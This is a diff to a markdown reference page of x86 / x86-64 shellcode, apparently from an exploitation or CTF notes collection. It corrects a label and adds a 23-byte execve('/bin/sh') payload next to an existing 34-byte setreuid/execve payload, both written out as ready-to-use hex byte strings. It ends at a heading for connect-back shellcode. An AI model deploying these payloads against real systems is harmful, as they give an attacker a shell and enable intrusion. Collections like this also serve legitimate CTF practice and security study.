@@ -17,10 +17,16 @@ title: x86 / x86-64
 
 ## Shellcodes
 
-- [setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) - 34bytes](https://shell-storm.org/shellcode/files/shellcode-399.html)
+- [setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) - 34 bytes](https://shell-storm.org/shellcode/files/shellcode-399.html)
 
 ```c
 "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
+```
+
+- [execve("/bin/sh",0,0) - 23 bytes](#shellcodes)
+
+```c
+"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
 ```
 
 - **Connect to 127.1.1.1 on 1337**
